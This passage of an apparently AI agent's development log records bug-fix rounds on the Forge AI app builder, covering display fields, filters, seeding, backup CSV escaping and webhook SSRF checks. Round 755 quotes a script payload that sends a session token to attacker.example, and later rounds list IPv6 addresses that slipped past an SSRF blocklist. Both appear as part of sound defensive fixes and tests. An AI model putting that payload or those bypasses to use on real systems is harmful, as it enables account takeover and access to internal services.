### Round 749: pickDisplayField's last-resort fallback could pick a file field, showing its raw JSON descriptor as a record's label (plus a related, previously-deferred backup-CSV gap)

Still no genuine reply from שלומי. Steered deliberately away from automations.ts/calendarIcs.ts/file-import topics (rounds 744-748's cluster) per this routine's own "don't fixate on one feature" guidance. The survey's only surviving candidate after an unusually thorough elimination pass (Business Twin, checkpoints, collaborators, Global Search, backup/zip, seed.ts, board/kanban, sort/group-by, and non-connection WhatsApp code all came back clean on direct reading) was flagged by the agent itself as still file-field-adjacent -- accepted anyway after independently confirming it is a genuinely different root cause (display-label selection, not CSV/calendar/validation formatting) and that it is real, verified across all four existing copies of the function.

**The gap**: `pickDisplayField`'s last-resort fallback (round 741) already excludes a `relation` field -- a join/line-item entity with no name/title/text field (e.g. `Enrollment { studentId: relation, courseId: relation, grade: enum }`) would otherwise have this function pick a relation field, and `recordDisplayLabel` would then show the *related* record's own raw id as if it were this record's own label. The identical exclusion was simply never added for `file`: a document-centric join entity (e.g. `Enrollment { studentId: relation, certificate: file }`, no name/title/text field) could pick the file field instead, and `recordDisplayLabel` would `String()` its raw JSON upload descriptor (`{url,name,size,mimeType}`) as the record's own label -- everywhere a record is shown by name: WhatsApp's "matched record" label (`whatsapp.ts`'s `findMatchingRecord`), Business Twin's relation-hub/duplicate-detection text, a relation field's own `<option>` list, CSV export/import's relation-cell matching. Confirmed by reading all four existing copies of this exact function directly: `entityFormatting.ts`, `displayField.ts`, and codegen.ts's two copies (the main `pickDisplayField` and the "Backup all data" feature's own `backupPickDisplayField`) -- every one had the identical gap.

**The fix**: renamed each copy's `firstNonRelation` variable to `firstDisplayable` and extended its filter to `f.type !== "relation" && f.type !== "file"`, in all four places, each with an updated doc comment cross-referencing round 741's own precedent.

**A second, related bug found and fixed while verifying the backup path**: `codegen.ts`'s `backupFieldDisplayValue` (the exported app's own "Backup all data" ZIP/CSV row-value formatter, distinct from `backupPickDisplayField`'s label-selection logic above) had no `"file"` branch *at all* -- not just in a fallback, but for every row of every file field, period. `docs/roadmap.md` had already found and explicitly flagged this exact gap once before, when file-field support first landed in this file, and deliberately deferred it "pending the whole feature decision" -- but that follow-up never happened, and the gap sat unfixed. Fixed by adding a `file` branch calling a new, minimal `backupFileFieldDisplayName` helper -- **not** the existing `parseFileFieldValue` the live-preview-equivalent fix would normally call, because (caught by this round's own test run, not assumed) `parseFileFieldValue` is embedded only in the `EntityView.jsx` template (`renderEntityViewJsx`), while `backupFieldDisplayValue` is embedded in the separate `server.js` template (`renderServerJs`) -- two independently-generated files with no shared scope. Calling the wrong one would have been a silent `ReferenceError` in the real exported app the very first time a real file field needed backup export, never caught by anything short of actually running the generated output. ### Round 751: a table filter got stuck on a type-incompatible value after a live refine changed the filtered field's type, silently emptying the whole table

Still no genuine reply from שלומי. Deliberately steered away from the automations.ts/calendarIcs.ts/file-field/AutomationsPanel.tsx/pickDisplayField/whatsappNotify.ts cluster (rounds 744-750) per this routine's own "don't fixate on one area" guidance -- the survey went deep on `EntityPanel.tsx`'s table-filtering logic instead of a broad sweep. Independently re-verified before implementing by reading the `fieldFilters` re-validation effect, the toolbar filter `<select>`'s render logic, and `visibleRecords`'s own filter predicate directly.

**The gap**: round 493's `fieldFilters` re-validation effect drops a persisted filter referencing a field that's been removed entirely -- keyed on `fieldNamesKey` (`entity.fields.map(f => f.name).join(",")`), re-running whenever the *set of field names* changes, since `EntityPanel` never remounts when a live Refine mutates the current entity's fields in place. That key was never designed to notice a field's *type* changing while its *name* survives (e.g. a `status` field going from `enum` to `boolean`) -- the set of names is identical before and after, so `fieldNamesKey` doesn't change and the effect never even re-runs. A filter value like `"won"` (valid a moment ago, when `status` was an enum) stays stored verbatim. `visibleRecords`'s own filter predicate (`String(r[fieldName] ?? "") === value`) then compares every record's real boolean value against `"won"`, which can never match -- the entire table silently empties. Unlike the field-removed case, there's also no visible sign anything is wrong: the toolbar `<select>` for a boolean field only ever has two real options (`"true"`/`"false"`, no synthetic-stale-value guard the way the `enum`/`relation` branches already have per round 508), so the stale value renders with nothing selected at all, instead of visibly showing the stale value with a working Clear button.

**The fix**: added `fieldTypesKey` (`entity.fields.map(f => \`${f.name}:${f.type}\`).join(",")`) as an *additional* dependency on the `fieldFilters` effect only (not `sortKeys`' sibling effect -- sorting by a retyped field's raw value is harmless, visually odd at worst, a genuinely different and much weaker failure mode, so it was deliberately left alone). Once the effect re-runs on any type change, it now also checks each filter value's *shape* against its field's *current* type, mirroring `validateAutomationFieldValue`'s own per-type checks (`apps/api/src/routes/projects.ts`): a `boolean` filter value must be exactly `"true"`/`"false"`, a `relation` filter value must be a plain non-negative integer id. An `enum` field needs no such check -- any stored string is already a plausible (if stale) enum value, and that specific staleness is exactly what the toolbar `<select>`'s own existing synthetic-option guard already surfaces visibly, unlike the boolean/relation cases.

**codegen.ts parity**: confirmed not needed, by reading `codegen.ts`'s own `sanitizeFieldFilters` directly -- it has the identical "names only" limitation, but the exported standalone app's `ENTITIES` array is baked in once at generation time with no live-refine mechanism at all, so a field's type can never actually change while any component stays mounted there. The bug class this round fixes is specific to the Forge AI platform's own live preview.

**The tests**: `EntityPanel.test.ts` gained one new test placed directly after round 493's own field-removed regression test, mirroring its exact harness (same `status` field, same `Deal` entity, same `view.rerender(...)` live-refine simulation) but retyping `status` from `enum` to `boolean` instead of removing it, confirming both records reappear once the now-type-mismatched filter is dropped.

**Verification**: two separate regression-proof cycles -- reverting the new `fieldTypesKey` dependency (confirming the effect must actually re-run on a type change, not just that the shape-check exists), then separately gating the boolean shape-check itself behind `false &&` (confirming that check's own logic is load-bearing) -- each reproduced the identical predicted failure (`waitForCondition: condition never became true`, the table staying empty forever), before being restored clean. The full `EntityPanel.test.ts` file ran clean standalone this time with no exit-hang (171/171) -- this file's own documented hang-on-exit flake is intermittent, not guaranteed every run. Only `apps/web` changed this round, so its own full suite ran: 1066/1066 clean. `npm run build` clean.

**Status**: shipped and pushed.

### Round 752: board card move select showed a misleading status for a record whose board field was null/unset

Still no genuine reply from שלומי. Deliberately steered away from the automations.ts/calendarIcs.ts/file-field/AutomationsPanel.tsx/pickDisplayField/whatsappNotify.ts/EntityPanel.tsx-fieldFilters cluster (rounds 744-751) per this routine's own "don't fixate on one area" guidance. Independently re-verified before implementing by reading `BoardCard`'s move-select logic directly in both `EntityPanel.tsx` and `codegen.ts`, plus `FieldInput`'s own enum branch for the established placeholder convention to mirror.

**The gap**: an earlier round already fixed `BoardCard`'s move `<select>` for a record carrying a *stale non-empty* board value (e.g. a legacy `"archived"` status no longer in the field's declared `enumValues`) -- its ternary adds that value as its own leading `<option>` so the control shows the real value instead of blanking. But that ternary (`currentBoardValue && !knownBoardValues.includes(currentBoardValue) ? [...] : knownBoardValues`) only ever adds *something* to the option list when `currentBoardValue` is truthy -- it never adds `""` itself. A record whose board field is simply null/unset lands in the exact same synthetic "(other)" board column (`groupByField`'s own established handling) but with `currentBoardValue === ""` and no matching `<option>` at all. This is routinely reachable: an optional (non-required) board field left blank at record creation, or -- more commonly -- any pre-existing row after a refine adds a brand-new enum field as the board field (`migrate.ts`'s additive-only `ALTER TABLE ... ADD COLUMN` always leaves existing rows `NULL`). The regression test confirmed the real failure mode is worse than a cosmetic blank: the controlled select falls back to selecting the *first* real enum option, actively misrepresenting the record's genuinely-unset status as whatever value happens to be declared first -- unlike `FieldInput`'s own enum branch, which never hits this because it always renders a disabled `""` placeholder option unconditionally, regardless of whether the current value is empty.

**The fix**: added `hasEmptyBoardOption` (`currentBoardValue === ""`), rendering a disabled `<option value="">…</option>` placeholder whenever the board value is empty -- the exact same convention `FieldInput`'s enum branch already always has. A genuinely stale non-empty value still gets its own leading option via the existing, unmodified ternary; the two cases don't overlap.

**codegen.ts parity**: fixed identically in both files -- `apps/web/src/EntityPanel.tsx`'s `BoardCard` and its byte-for-byte-equivalent copy in `apps/api/src/codegen.ts`, matching the existing placeholder text convention each file already used (`t("entity.select")` in the live preview, the bare `…` already used in codegen.ts's own `FieldInput` enum branch).

**The tests**: `EntityPanel.test.ts` gained one new test placed directly after the existing stale-non-empty-value test, mirroring its exact structure (same default fixture, same board view, same `.board-card-move` query) but with `status: null` instead of `"archived"`, confirming the select's value stays `""` with a real matching (disabled) option rather than `selectedIndex === -1` or a wrong value. `codegen.test.ts` gained one new test extracting the real generated `hasEmptyBoardOption` computation (same `new Function` convention this file already uses for `boardOptionValues`), confirming it's `true` for both a `null` and a missing status field and `false` for a real value, plus a regex check that the placeholder actually renders in the generated JSX when the flag is true.

**Verification**: two separate regression-proof cycles -- one per file, each via a real inert-condition gate (`false &&`, never commenting out a line) -- reproduced the exact predicted failure in each (the live-preview test caught the select falling back to the wrong first-declared status value instead of staying empty; the codegen.ts test caught `hasEmptyBoardOption` computing `false` instead of `true`), before being restored clean. The related, pre-existing `boardOptionValues`-only test (asserting a missing value adds *no* spurious `""` entry to that specific array) was re-run and confirmed still correct and unaffected, since this fix added a wholly separate flag rather than changing `boardOptionValues` itself. Both workspaces changed, so both ran in full sequentially: `apps/api` 517/518 (the sole failure being the same pre-existing, now-sextuply-confirmed-unrelated `codegen.test.ts` exit-hang flake), `apps/web` 1067/1067 clean. `npm run build` clean for both.

### Round 753: the Seed Data step and the QA smoke test both mishandled a required "file" field

Still no genuine reply from שלומי. Deliberately steered away from the 12-round-deep file-field/automations.ts/WhatsApp-display/EntityPanel-stale-value cluster (rounds 741-752) per this routine's own "don't fixate" guidance, into the build pipeline instead -- a genuinely different area. Independently re-verified before implementing by reading `seedValueFor`'s `"file"` case (`packages/db/src/seed.ts`), the Seed Data loop and `runQaChecks` directly in `apps/api/src/pipeline.ts`, and `repository.ts`'s `coerceValue` (confirming its field-iteration order and exact `ValidationError` message format).

**The gap (Seed Data)**: `seedValueFor` deliberately returns `null` for every `"file"` field -- there's no real uploaded file to point a seeded record at. For an *optional* file field that's harmless. For a *required* one, `insertRecord`'s own `coerceValue` rejects every single generated seed record for that entity with the identical `Field "X" is required` error -- a structural, unfixable-by-retrying failure, not a one-off. The loop doesn't abort on a per-record failure, so it silently piled up one duplicate error per generated record (2, by `generateSeedRecords`'s own default count) instead of recognizing upfront that the whole entity can never be seeded -- the exact "file field makes the operation structurally impossible" case `buildImportRecords` (CSV import, round 746) and `handleDuplicate`/`handleBulkDuplicate` already refuse outright for, rather than attempting a doomed operation.

**The gap (QA smoke test)**: `runQaChecks`'s own doc comment states its `validRecord` baseline is "valid for every OTHER field, so omitting exactly the field under test is the only thing that should make `insertRecord` reject it." That invariant was silently false whenever the entity has a required file field, since `generateSeedRecords` leaves it `null` there too. `coerceValue` processes fields in **array declaration order** and throws on the *first* empty-required field it hits -- so testing a *different* required field declared *after* a required file field got rejected for the file field instead, while the old code only checked `err instanceof ValidationError`, never which field the thrown message actually named. It silently credited `"required-field validation enforced for \"signedDate\""` even though `signedDate`'s own required-check was never actually exercised -- if that check were ever genuinely broken, this exact scenario would still "pass" with zero sign anything was wrong.

**The fix**: Seed Data now checks each entity upfront for a required file field and skips it with one clear, honest message (`"... has no real uploaded file to point a sample record at; add its first record(s) by hand once the app is live."`) instead of attempting any insert. `runQaChecks`'s `validRecord` now fills in a placeholder string for any required file field before the per-field loop (`coerceValue`'s `"file"` case has no shape validation at all, so any non-empty string satisfies it) -- restoring the documented invariant. As a second, defense-in-depth layer, the catch block itself now also verifies the thrown error's message actually names the field under test, falling back to an honest `FAILED` entry naming the real mismatch if it doesn't -- this is what actually makes the new regression test fail without the placeholder fix, since the check-list *string* alone (`"required-field validation enforced for ..."`) is identical whether the check genuinely ran or was merely assumed to.

**codegen.ts parity**: confirmed not needed -- the exported standalone app has no build pipeline, Seed Data step, or QA smoke test at all (grepped for `runBuildPipeline`/`runQaChecks`/`seedValueFor`: no matches).

**The tests**: `pipeline.test.ts` gained two new tests. One runs a real end-to-end build (same `collect(runBuildPipeline(...))` harness every other Seed Data test in this file already uses) against an `Applicant{name, resume: file required}` spec, confirming the Seed Data event reports exactly one clear message and zero seeded records, not two duplicate insert-rejection errors. The other calls `runQaChecks` directly against a `Contract{attachment: file required, signedDate: date required}` entity (the file field declared *first*, reproducing the real ordering bug), confirming both fields' own required-checks are now correctly and independently attributed.

**Verification**: three separate regression-proof cycles -- the Seed Data skip guard, the `validRecord` placeholder fill, and (after discovering the first regression-proof attempt on the placeholder fill alone passed anyway, since the check-list string doesn't differ between a real and a falsely-credited "enforced" result) the stricter catch-block message check, each via a real inert-condition gate (`false &&`, never commenting out a line) -- the third attempt correctly reproduced the exact predicted failure once both the placeholder fix and the stricter catch were tested together, before being restored clean. Only `apps/api` changed this round, so its own full suite ran: 518/520, the two failures being the already-quintuply-confirmed-unrelated `codegen.test.ts` exit-hang flake and `auth/password.test.ts`'s own documented CPU-contention timing flake (re-confirmed passing cleanly in isolation). `npm run build` clean.

**Status**: shipped and pushed.

### Round 755: a file-type field's upload was never restricted by content type, letting a collaborator run script on this app's own origin against another collaborator's session

Still no genuine reply from שלומי. Two candidates were investigated and rejected before the real fix, both worth recording so a future survey round doesn't re-propose them:

**Rejected candidate 1 -- `checkpointDiff.ts`'s `fieldSignature()` omitting `required`**: a survey agent flagged this as a gap (a required-ness flip not counted as a "field shape change" for checkpoint-diff purposes). Implemented the fix (adding `${f.required}` to the signature string, updating two doc comments) before discovering, while hunting for an existing test to mirror, that `checkpointDiff.test.ts` already has a dedicated test asserting the *opposite* is intentional: `"computeCheckpointDiff never flags a field as changed just because its label or required-ness differs -- only type/enum/relation shape matters"`, with `assert.deepEqual(diff.changedEntities, [], "a label rename or required-ness flip alone must not be reported as a structural change")`. Reverted immediately via `git checkout -- apps/web/src/checkpointDiff.ts` before any commit. Lesson reinforced: checking whether a "problem" is a deliberate feature must include reading the *existing test suite* for the area, not just the target function's own code/comments -- the test suite is the authoritative record of intentional vs. accidental behavior.

**Rejected candidate 2 -- `whatsapp.ts`'s `findMatchingRecord` phone-suffix-matching heuristic**: a backup candidate from the same survey, flagged as a possible false-positive risk (two different real contacts' stored numbers coincidentally sharing a 7+ digit suffix). Checking this round's own earlier history first (grepping `docs/roadmap.md` for `findMatchingRecord`) turned up that an earlier round already investigated this exact function as a runner-up candidate and concluded it's "a deliberate, documented design choice, not an accidental gap" (its own doc comment explicitly frames the suffix comparison as a necessary best-effort tradeoff for reconciling local-vs-international phone formats). Abandoned without touching any code.

Both dead ends led to launching a fresh Explore survey steered away from the entire already-covered cluster (rounds 741-754) plus both rejected candidates above, which surfaced the real finding below.

**The gap**: nothing in the upload pipeline restricts what content type a `file`-type field's upload can be. `safeFileExtension` (`apps/api/src/routes/projects.ts`) only bounds the *stored filename's* extension against path-traversal characters -- its own doc comment says exactly that, nothing about content type -- and `createUploadMiddleware`'s multer config has no `fileFilter` at all. `app.ts` then serves every uploaded file back through a plain `express.static(uploadsDir)` mount at `/api/uploads`, with no `Content-Disposition`, `X-Content-Type-Options`, or CSP anywhere in the codebase (grepped for `helmet`/`nosniff`/`Content-Security-Policy`: no matches). `EntityPanel.tsx` opens every file field's value through a plain `<a href={fileValue.url} target="_blank" rel="noopener noreferrer">` -- `noopener`/`noreferrer` only block the new tab from reaching back to `window.opener`; they do nothing to stop a same-origin HTML document's own script from running.

**Concrete failure scenario**: any collaborator with write access to a project (an ordinary editor, not just the owner -- `requireProjectWriteAccess` gates the upload route the same as any other write) uploads a `.html` file to a `file`-type field whose body is `<script>fetch('https://attacker.example/steal?t='+localStorage.getItem('forge.token'))</script>`. The server accepts it -- no filter exists to reject `.html`/`text/html`. Any other user who later opens that record and clicks the file link (including the project *owner*) navigates to `/api/uploads/.../<uuid>.html`, which the browser renders and executes as a real HTML page on this app's own origin -- reading and exfiltrating that victim's session token from `localStorage`, enabling full account takeover. The identical primitive works with a `.svg` upload (`image/svg+xml` with inline `<script>`). Confirmed `apps/api/src/app.test.ts`'s only existing upload tests all use `.pdf`/`application/pdf` and never assert anything about content-type restriction or response headers, and `docs/roadmap.md`'s own prior dedicated security sweep (identifiers.ts SQL-injection guard, csvEscape formula-injection guard, session-expiry check) never touched upload content-type validation -- genuinely unaudited territory, not a previously-accepted risk.

**The fix**: rather than maintain a content-type/extension allowlist (which a spoofed multipart `Content-Type` header could bypass, and which `.svg`'s legitimate-looking-but-scriptable nature makes awkward to allowlist safely anyway), `app.ts`'s `/api/uploads` static mount now sets `Content-Disposition: attachment` (plus `X-Content-Type-Options: nosniff` as defense-in-depth) on every response via `express.static`'s `setHeaders` option. This forces a download instead of an inline render/execute for *any* uploaded file, regardless of what content type was ever accepted at upload time -- closing the hole at the one place that actually matters.

**codegen.ts parity**: confirmed not needed -- the exported standalone app has no upload functionality at all; its own UI explicitly says so ("Files can't be added or changed in an exported app -- only the live Forge AI preview supports file uploads"), and grepping `codegen.ts` for `uploads`/`express.static` found only the unrelated static-dist-serving line.

**The tests**: `app.test.ts` gained one new test alongside the existing upload round-trip test -- uploads a `.html` file whose body is the exact exfiltration payload from the failure scenario above, fetches it back through the real `/api/uploads` URL the upload route returned, and asserts the response carries `Content-Disposition: attachment` and `X-Content-Type-Options: nosniff` (while confirming the file's own bytes are untouched -- only how it's served changes).

**Verification**: one regression-proof cycle -- gating both `res.setHeader(...)` calls behind `if (false)` (a real inert-condition edit, not commenting anything out) -- reproduced the exact predicted failure (`actual: null` where `'attachment'` was expected), before being restored clean, confirmed by re-running both the new test and the pre-existing upload round-trip test together (2/2 pass). Only `apps/api` changed this round, so its own full suite ran: 521/522, the sole failure being the same, now-septuply-confirmed-unrelated `codegen.test.ts` exit-hang flake. `npm run build` clean.

### Round 756: the "Backup all data" ZIP's own CSV guard was missing a fix its sibling already had, corrupting a value with a genuine leading apostrophe on re-import -- and correcting a factually wrong prior round's conclusion

Still no genuine reply from שלומי. Deliberately steered away from round 755's just-closed file-upload/XSS area and both of its rejected candidates, into a fresh Explore survey covering new ground (also nudged to keep exploring the security-adjacent lens round 755 opened, since it hadn't been exhausted).

**The gap**: `apps/api/src/backup.ts`'s `csvEscape` (used by the "Backup all data" ZIP route) and its matching duplicate inside `apps/api/src/codegen.ts`'s `renderServerJs` template (the exported standalone app's own `/api/backup` route) both guard a value starting with `=`, `+`, `-`, `@`, tab, or CR with a leading `'`, to defend against CSV/formula injection -- but neither guards a value that **already starts with a literal `'`** followed by one of those same characters. The general entity CSV export/import feature's own `csvEscape` (`apps/web/src/entityFormatting.ts`, and codegen.ts's separate `renderEntityViewJsx` copy) already carries exactly this fix, added in an earlier round: without it, a value like `"'-interesting"` (a real leading apostrophe immediately followed by a guarded character) exports to the identical bytes the guard produces for the unguarded value `"-interesting"`, so the shared unescape logic (`unescapeCsvGuard`) can't tell them apart on import and silently strips the real apostrophe. backup.ts's own doc comment explicitly states this backup CSV "could plausibly be re-imported via the per-entity 'Import CSV' feature, which shares this exact column format" -- i.e. the exact round-trip this bug breaks is one the code's own author anticipated and endorsed, yet the two backup-specific copies of `csvEscape` never got the matching fix.

**Correcting a factually wrong prior conclusion**: an earlier round's roadmap entry (the one that added the fix to the general-import `csvEscape`) explicitly considered backup.ts's and codegen.ts's backup-specific `csvEscape` copies and concluded "neither has any unescape/import counterpart at all (backups are never re-imported through this guard), so neither one carries this bug and neither needed a fix." That's demonstrably wrong -- backup.ts's own comment says the opposite, and the backup CSV genuinely shares the general Import CSV feature's column format and unescape logic. This round's survey agent independently reproduced the corruption empirically (not just by reasoning about the code): running the real `generateBackupZipEntries` output for a `"'-interesting"` value through the real `parseCsv`/`unescapeCsvGuard` import path returned `"-interesting"`, confirming the apostrophe is genuinely lost. Checked `apps/api/src/backup.test.ts` directly and confirmed it has no test for this leading-apostrophe case at all -- only a plain formula-injection test (`=cmd|...`) that never exercises this code path -- so this wasn't a deliberately tested, settled design decision either; it was a previously mis-closed candidate.

**The fix**: widened both backup-specific `csvEscape` copies' guard regex from `/^[=+\-@\t\r]/` to `/^[=+\-@\t\r']/` (apps/api/src/backup.ts and the matching string-templated copy in apps/api/src/codegen.ts's `renderServerJs`), exactly matching the already-fixed general-import `csvEscape`. No new unescape logic was needed in either backup writer -- they have no importer of their own; the fix only needed to produce output the *existing* `unescapeCsvGuard` already correctly reverses, which it now does since both writers use the identical encoding scheme.

**codegen.ts parity**: both the live-preview backup route (backup.ts) and the exported app's own backup route (codegen.ts's `renderServerJs` copy) were fixed in this same round -- confirmed via direct line-by-line comparison that the exported app's general-import `csvEscape` (`renderEntityViewJsx`, a separate template scope) already had the fix from the earlier round, and only its own backup-specific copy (`renderServerJs`) had been missed.

**The tests**: `backup.test.ts` gained one new test mirroring its own existing formula-injection test's structure -- inserts a `"'-interesting"` name, generates the real backup ZIP, and asserts the CSV line reads `"''-interesting,חדש"` (double-guarded). `codegen.test.ts` gained a mirroring test using the established `new Function(...)`-based real-generated-source extraction convention, reusing the exact same assembly this file's own adjacent "entityToCsv disambiguates two columns that share a label" test already uses.

**Verification**: two separate regression-proof cycles (one per file) -- gating each fixed regex behind a `false ? ... : ...` ternary (a real inert-condition edit, not commenting anything out) -- each reproduced the exact predicted failure (`"'-interesting,חדש"` instead of `"''-interesting,חדש"` in backup.test.ts; `"'-interesting"` instead of `"''-interesting"` in codegen.test.ts), before being restored clean and re-confirmed passing alongside their respective sibling tests. Only `apps/api` changed this round, so its own full suite ran: 521/523, the two failures being the same, now-octuply-confirmed-unrelated `codegen.test.ts` exit-hang flake and `auth/password.test.ts`'s own documented CPU-contention timing flake (re-confirmed passing cleanly in isolation). `npm run build` clean.

**Status**: shipped and pushed.

### Round 757: an Automation Rule's webhook URL could be blocked for no reason if its hostname merely started with the same digits as a private IP range

Still no genuine reply from שלומי. Round 756's own survey agent had already surfaced this as a ready, independently-noted secondary candidate ("untested, no existing test locks in the current overblocking as intentional") -- per this routine's own standing process, a ready backup candidate from a prior survey is used directly rather than running a brand-new Explore survey from scratch.

**The gap**: `apps/api/src/automations.ts`'s `BLOCKED_WEBHOOK_HOSTNAME_PATTERNS` (feeding `isAllowedWebhookUrl`, the SSRF guard on an Automation Rule's webhook action) used plain, unanchored-at-the-end prefix regexes to catch private/loopback/link-local IPv4 literals: `/^10\./`, `/^172\.(1[6-9]|2\d|3[01])\./`, `/^192\.168\./`, `/^127\./`, `/^169\.254\./`. `.test()` only anchors at the start, so these also matched any ordinary **hostname** that merely starts with the same digits -- not just a genuine private IP. Reproduced empirically (ran `isAllowedWebhookUrl` directly, not just reasoned about the regex): `isAllowedWebhookUrl("https://10.example.com/webhook")`, `isAllowedWebhookUrl("https://192.168.mycompany.io/hook")`, and `isAllowedWebhookUrl("https://172.16.shop.com/x")` all incorrectly returned `false` -- none of these are private IPs; they're ordinary public DNS hostnames. A real business wanting to point an Automation Rule's webhook at a domain under one of these digit prefixes (a literal "10." subdomain of a real company domain, or a SaaS/vendor domain that happens to start with "127" or "172.16") had no way to use that endpoint at all, with only the generic "This rule has no valid webhook URL configured" failure and no indication why.

**Why this is not deliberate**: `apps/api/src/automations.test.ts`'s existing `isAllowedWebhookUrl` tests (the three tests covering the plain-IPv4, IPv4-mapped-IPv6, and IPv6-unspecified cases) only ever exercise literal IP-address hosts (`"10.0.0.5"`, `"172.16.0.5"`, etc.) -- never a hostname merely *starting* with those digits -- so nothing locks in the current over-broad blocking as intentional. The function's own doc comment discusses the security tradeoff of this blocklist being "deliberately cheap... not full SSRF-proofing" (no DNS-rebinding protection, no redirect-following check), which is about what it doesn't catch, not about what it over-catches -- this false-positive angle was never considered.

**The fix**: split `BLOCKED_WEBHOOK_HOSTNAME_PATTERNS` into two arrays. `BLOCKED_IPV4_HOSTNAME_PATTERNS` (the five dotted-decimal prefix patterns above) is now only checked against a hostname that Node's own `net.isIP` confirms is actually a valid IPv4 literal -- an ordinary hostname that isn't a real IP address never reaches these patterns at all. `BLOCKED_OTHER_HOSTNAME_PATTERNS` (the exact-match `"localhost"` and every IPv6 pattern) is run unconditionally, since none of those can ever collide with a real hostname's spelling -- `"localhost"` is an exact string match, and a colon is never valid in an ordinary DNS hostname (it only appears in a URL's bracketed IPv6-literal form), so a domain literally starting with `"fe80:"` or similar is impossible. Verified empirically after the fix: all three previously-false-positive hostnames above now correctly return `true`, while every genuine private/loopback/link-local IPv4 literal this blocklist exists for -- including the cloud instance-metadata IP (`169.254.169.254`) and the same addresses wrapped as IPv4-mapped IPv6 literals (`[::ffff:127.0.0.1]`, etc.) -- still correctly returns `false`, unchanged from before.

**codegen.ts parity**: confirmed not needed -- the exported standalone app has no Automation Rules/webhook feature at all (grepped `codegen.ts` for `isAllowedWebhookUrl`/`BLOCKED_WEBHOOK_HOSTNAME`/`webhook`: no matches).

**The tests**: `automations.test.ts` gained one new test mirroring its own existing `isAllowedWebhookUrl` test structure -- asserts all five previously-false-positive hostname patterns (`10.example.com`, `192.168.mycompany.io`, `172.16.shop.com`, `127.company.net`, `169.254.example.org`) are now allowed, alongside the five corresponding real private/loopback/link-local IPv4 literals still being blocked in the same test.

**Verification**: one regression-proof cycle -- widening the new `isIP(hostToCheck) === 4` guard condition to `(false || isIP(hostToCheck) === 4 || true)` (a real inert-condition edit that makes the guard always pass regardless of whether the hostname is actually an IPv4 literal, restoring the old unconditional-prefix-match behavior) -- reproduced the exact predicted failure (`"a public hostname starting with '10.' is not a private 10.x address"` -- `false !== true`), before being restored clean and re-confirmed passing alongside the three pre-existing `isAllowedWebhookUrl` tests (4/4 pass). Only `apps/api` changed this round, so its own full suite ran: 523/524, the sole failure being the same, now-ninthly-confirmed-unrelated `codegen.test.ts` exit-hang flake. `npm run build` clean.

**Status**: shipped and pushed.

### Round 758: the webhook URL blocklist's IPv6 ULA/link-local patterns were a literal-group match, not a real range check -- a genuine SSRF bypass (false negative, the opposite bug class from round 757's false positive)

Still no genuine reply from שלומי. Round 757's own survey agent had already surfaced this as a ready, independently-noted primary candidate while investigating the same function, flagged as "a false negative with real SSRF impact... an implementation bug, not an accepted tradeoff." Per this routine's own standing process, this ready candidate was used directly.

**The gap**: `apps/api/src/automations.ts`'s `BLOCKED_OTHER_HOSTNAME_PATTERNS` (feeding the same `isAllowedWebhookUrl` SSRF guard round 757 touched) blocked IPv6 unique-local (ULA, `fc00::/7`) and link-local (`fe80::/10`) addresses with `/^\[?fc00:/i`, `/^\[?fd00:/i`, and `/^\[?fe80:/i` -- regexes that only match those exact single literal hex groups, not the real CIDR ranges the surrounding comment's own stated intent ("the IPv6 loopback/link-local equivalents") describes. `fc00::/7` covers every address whose first byte is `0xfc` or `0xfd` (first hex group `fc00`-`fdff`); almost every real-world ULA is "locally assigned" with a random 40-bit global ID per RFC 4193, so a real one looks like `fd12:3456:789a::1` or `fdab:cdef::1` -- never literally `fd00:....`. `fe80::/10` covers first hex group `fe80`-`febf`; a real link-local address almost always has a non-zero interface identifier, e.g. `fe81::1`, not the bare `fe80::` group alone. Reproduced empirically (ran `isAllowedWebhookUrl` directly): `isAllowedWebhookUrl("http://[fd12:3456:789a::1]/hook")`, `isAllowedWebhookUrl("http://[fdab:cdef::1]/hook")`, `isAllowedWebhookUrl("http://[fc01::1]/hook")`, and `isAllowedWebhookUrl("http://[fe81::1]/hook")` all incorrectly returned `true`. Any project collaborator with write access to an Automation Rule's webhook action could point it at an internal IPv6 ULA/link-local service (common in self-hosted/Docker/Kubernetes deployments) and `fireWebhookAction`'s `fetch()` call would actually POST to it -- bypassing this exact SSRF guard via the IPv6 side, the opposite bug class from round 757's IPv4-side false positive.

**Why this is not deliberate**: `automations.test.ts`'s existing `isAllowedWebhookUrl` tests only ever exercised the all-zero IPv6 cases (`::`, `::1`) and, after round 757, IPv4-dotted hostnames -- never a non-zero ULA/link-local address like the ones above. The surrounding code comment's own stated goal ("the IPv6 loopback/link-local equivalents" of the already-correct IPv4 ranges) is broader than what the regex literally implements, pointing to an implementation bug (an exact-prefix string match where a true range check was intended) rather than an accepted tradeoff.

**The fix**: replaced the three literal-prefix regexes with two range-correct ones: `/^\[?fe[89ab][0-9a-f]:/i` for the real `fe80::/10` range (first byte `0xfe`, second byte's top two bits fixed at `10`, i.e. second byte `0x80`-`0xbf`), and `/^\[?f[cd][0-9a-f]{2}:/i` for the real `fc00::/7` range (first byte `0xfc` or `0xfd`, second byte unconstrained). Verified the exact range boundaries empirically both before and after: addresses just outside each real range (`fe00::`, `fec0::`) are correctly left unblocked on both sides of the fix, while every address inside each range -- the old literal groups `fc00::`/`fd00::`/`fe80::` and the previously-missed non-trivial ones (`fd12:3456:789a::1`, `fdab:cdef::1`, `fc01::1`, `fe81::1`, `febf::1`) -- is now correctly blocked. Also fixed a stale doc comment on `extractIPv4MappedAddress` left over from round 757's rename/split of the old single `BLOCKED_WEBHOOK_HOSTNAME_PATTERNS` array (it still referenced that array's name and the old literal-prefix list), noticed while reading the surrounding code for this fix.

**codegen.ts parity**: confirmed not needed -- same as round 757, the exported standalone app has no Automation Rules/webhook feature at all.

**The tests**: `automations.test.ts` gained one new test mirroring its own existing `isAllowedWebhookUrl` test structure -- asserts every previously-missed non-trivial ULA/link-local address is now blocked, the already-blocked literal cases (`fc00::`, `fd00::`, `fe80::`) remain blocked, and addresses just outside each real range (`fe00::`, `fec0::`) plus a genuinely public IPv6 address remain allowed.

**Verification**: one regression-proof cycle -- reverting both range-correct regexes back to the original three literal-prefix patterns (a real, targeted edit restoring the exact prior behavior, not a blanket gate) -- reproduced the exact predicted failure (`"a randomly-assigned ULA address must be blocked, not just the literal 'fd00::' group"` -- `true !== false`), before being restored clean and re-confirmed passing alongside all four pre-existing `isAllowedWebhookUrl` tests (5/5 pass). Only `apps/api` changed this round, so its own full suite ran: 524/525, the sole failure being the same, now-tenthly-confirmed-unrelated `codegen.test.ts` exit-hang flake. `npm run build` clean.

**Status**: shipped and pushed.

### Round 762: pickDisplayField's "first text field" fallback never matched longtext fields, duplicated in all four copies of this function

